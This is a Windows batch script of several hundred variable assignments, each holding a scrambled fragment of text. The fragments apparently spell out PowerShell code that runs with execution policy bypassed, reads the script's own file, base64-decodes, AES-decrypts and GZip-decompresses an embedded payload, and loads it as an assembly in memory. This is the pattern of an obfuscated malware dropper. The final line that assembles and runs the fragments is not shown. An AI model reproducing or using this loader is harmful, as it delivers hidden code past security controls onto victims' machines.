@echo off
set "kxXqSqrqIx=pDZz"
set "pLbYdBbwHr= [Sy"
set "xDhwlOJmtV=$hrF"
set "xcRGZMegcr=O.Me"
set "KPQKiARear=3); "
set "GxZooofbFb=nxCg"
set "ccVOkYxoES=y.Cr"
set "ONBBqiPyjA=flec"
set "YzIYFpWPIR=-joi"
set "rswZAlfFfp=m(, "
set "eohLwZVVAD=16] "
set "chYneXAqPh=:: '"
set "zOAtnzAuix=wPgL"
set "YhKVHEDqlV=oHUl"
set "pehLioLekS=hrFf"
set "ebexaiGFXr=grap"
set "xuFVdUgMXx=[Sys"
set "njXxLDuDdy=u.Pa"
set "ShLFsMqWFm=[]] "
set "SBEklBKYCy=);$v"
set "pMCebbcMvV=rans"
set "zvgGiNFtZU=6esa"
set "OKFRQIcKHS=OyzA"
set "feLkWRVAAT=and "
set "rAMyrrsazw=tem."
set "DipOJvcOZA=ress"
set "iZxbpjCjeO= [Sy"
set "htPClnvUqy=ay()"
set "qyEIciewMS=  $i"
set "jZsfQMXzbs=ecry"
set "ePCzofNDXK=fore"
set "oAAYvWQpGi=nirt"
set "plWeWnhZzE=sion"
set "bxMLiyZaaP=rFfs"
set "drxhRegIeI=v4Ir"
set "dejJbKcoot=BC;$"
set "scIuAtDkFP=ateD"
set "aLaRVbWORF=.-16"
set "DyfLRXHpej=L, 0"
set "opbMdWdBXw='[-1"
set "LWbJInzOSr=ypto"
set "KEMybHhtZw=);$H"
set "GWmqEXlnqn=ksPu"
set "bmNzWwdWZX=eEPV"
set "NXmssIqcVK=pStr"
set "cgdomeyYzJ=m.Re"
set "TImculvexy==');"
set "mRFTImqOvf=hk ="
set "iVYAiEzTid=.Cop"
set "IpJmIrLmRs=hy.A"
set "HfyYmzllLF=ke($"
set "QNiIZtvzAE= if "
set "nmEMhPkcty=saBm"
set "hsOiNTnOfu=L = "
set "VluiYekwwE=comp"
set "VHWOUsZEMn=Fm, "
set "GUtRtqoGfK=stem"
set "GroPkrRCkN=oArr"
set "XkeXzPBXyM=();$"
set "lzPTpgJbLj=ptor"
set "EMAuLIEmyF=TllA"
set "NCwclSAdTt=)($g"
set "AOgzMbiBEq=.Ass"
set "SsPldRJMhp=rtS4"
set "kWyDQgXloa=comm"
set "FvGczFanwp=ddin"
set "XQElMDNJoC=qcq "
set "JJFwZnhKJN='dqR"
set "ManVsNNSbX=S46e"
set "qXeUQtpiUN=ksPu"
set "WyyUkdTRyO=New-"
set "dnrgfWDfWJ=trea"
set "uRUjOMCxEQ=();$"
set "wqDitjqJdU=('%*'"
set "hMvPUbpgnW=ct S"
set "utnJZjcIai=.Com"
set "YgGCcUeSTD=).Sp"
set "hfleXcaIFW=ment"
set "fDbSEYztMy=Syst"
set "mVSiCSzGbW=;$Pe"
set "gSwUKATkdj=Bmor"
set "OHFLDtodEo=esaB"
set "eStJZMsrkU=le  "
set "EBboPlvpUR=ress"
set "qwYHuCwcGN=oint"
set "FdobsmYfIG= '')"
set "GqqrGIYeXu=.Dis"
set "RQMaQQncDI=.Len"
set "mdMDlYfijs=g) {"
set "AgVXAwfVIU=y.Pa"
set "XZehUtyDFL=-ep "
set "nGiUlILoVq=0O+g"
set "SeDXAbElTq=O.Su"
set "RaTkrDLMtf=Disp"
set "xBcVbKORpY=Comp"
set "tvoSeGKtqI=+hAO"
set "otOTJGANAQ=embl"
set "ZnNArnBRob=yTo("
set "ouLSzaJwoq=sGUc"
set "iSwzPXauIq=ion."
set "GftcZkJCqe=ach "
set "unSXAZGwOP=Invo"
set "PkSfktsoTv=ksPu"
set "vEdjsdieLy=L.En"
set "wDPuZRebXs= = $"
set "PQBzQyxMZx=iron"
set "rBYQsIicSO=.Dis"
set "euPErcAWxY=ptog"
set "TFXNuupmDL= '')"
set "yopYaDXXkE=.Cry"
set "hdQFgdosVT=;$qx"
set "wepJYgLRJR=tsWi"
set "wUPBsZcVHD=, (,"
set "dHJDTWxqzl=);$h"
set "SnzVBnOudc=Mg ="
set "gctjtDIqWg=rofi"
set "KDoUuzjimY=6] -"
set "FucBsHRADo= = $"
set "ldRmoDBrmy= [st"
set "uWBnTYwYqO=mory"
set "cIUIliAfAO=ZYYc"
set "jAUkBeQLHc=cq.T"
set "rDroYuxVaJ=);$P"
set "lBBaVaXbNO=y]::"
set "uetoxNOXog=tryP"
set "hHGtxHyEGJ=Fina"
set "GuDJnZDIQu=::De"
set "SCVaqSAZxJ=.Cry"
set "pnQpGOTlOc=, $g"
set "ZPqPLElXzr=join"
set "KCzwvrfjqe=$PMq"
set "NRFUXhNLgf=gth)"
set "kpUWfYzTmQ=('%~f0'"
set "jbKkhEHIWh=stem"
set "cYGVaVyXaN=esFX"
set "wmlMlGTKQt=($oH"
set "pqQpVjtEwB=oin "
set "WQrHLKxFfG=esMa"
set "wmhGrzAQzP=qcq."
set "fYwxHSszic=rt]:"
set "GyoOUcIZWS=urit"
set "pSvNvBZQzC=m.IO"
set "BQIgoHiGvg=Disp"
set "LiRRuClnEC=qxaF"
set "OZSskrjWBm=ct S"
set "OUuFVPXLxs=;$PM"
set "PFbwScvMmz=rity"
set "wthAafUWTr=daeR"
set "xWwIOSGOwS=ewLi"
set "UAQiMjXFTH=t Sy"
set "CWkgzWyykr=Obje"
set "IORUCjPahU=gL ="
set "XVUdwDoJxN=-nop"
set "njucSuVFbW=..-1"
set "krIiomfxmX=th('"
set "usfBjoKNqO=join"
set "FgxVAopYTx='txe"
set "cRWDKZaPAd=$gwP"
set "pcZbakPKYF=rity"
set "JtiYTtrufw=ode]"
set "ucpQYaaKBT=yste"
set "XaDcRYmfEL=-1.."
set "pptfTZWIsj=ispo"
set "wusNbfFKie=.Key"
set "KOsCqwmsRR=New-"
set "cdjvdueOaG=$qxa"
set "kDMnhmOoWP=-Obj"
set "SGYfGIfITO=Conv"
set "hxPYLVmvJY=ddin"
set "kmrdQJfsLw=em.I"
set "fhPOLQWFpt=hk.T"
set "JwcNCmnviJ=pose"
set "knXTiflMbu=bypa"
set "osOvFuhKdn=ck($"
set "BTKziRFPJJ=.IO."
set "NYPdvBWCnN=('l0"
set "QNcRwPKHff=morF"
set "nhpsYpPiAq=Secu"
set "SOqhTFhIyn=V = "
set "PGIWnqHWgR=1..-"
set "DswZEdMzZO=se()"
set "bFktFSQFHh=Stre"
set "uFqDnqoLzW=;$mv"
set "WhLYinZNXr=fs.D"
set "HJJLoChPVp=vj0m"
set "qbvNRssOfs=Pu.I"
set "CTgENaYyOc=nage"
set "zOskgoImJU=form"
set "YbibByOdSc=tion"
set "JkXxaewcrF=Mode"
set "LaAqOOifzH=.Mod"
set "ANEafMVlmr=Star"
set "pLqeolHvih== $v"
set "KTnZgqfhRO=gMod"
set "biMMmwmzfQ=onve"
set "bdSaqFYbrE=[-1."
set "ZeARTHSVRk=7;$v"
set "SWemevcMUY=)($i"
set "TKWMWgjFoC=AGhk"
set "WedPMNpTFt=[IO."
set "WJdXCfRrsX=]::N"
set "QhIemnRWyG=gwPg"
set "oBEjFdwGDj=; };"
set "qufwjZHbOp=('da"
set "MjqJPFLNPN=em.C"
set "ojvbIPybxS=stem"
set "VFNZEKmocf=y.Ci"
set "LsIYOLVZrY=.Mem"
set "vRmdepXKrY=nxCg"
set "ekjHjtEbMk=Comp"
set "KfrUUuONAb=($oH"
set "uGbcqueWAw=.Sec"
set "yeAlMxIjkJ=L = "
set "zNfSJLzqFo=raph"
set "pEdUtzJJGv=.Con"
set "kWEAkbamuj=3HWs"
set "tSopQmClGW=);$v"
set "mgbWvSSxag=s = "
set "MOocJXwhfa=ose("
set "sHxwuYGSjl=gnir"
set "yzrUArSsFb=::('"
set "MzEZcpslPP=ptog"
set "ZzZkQXHINq=-joi"
set "BGpQGJFdBP=$eZC"
set "KvUJxfvZDP=Secu"
set "TnrLKVwcqv=bstr"
set "gbGkITBTev=Obje"
set "PwogKcvwTj=ksPu"
set "yHalSHtWtI=UlO "
set "JCYKUzsQmM=]::("
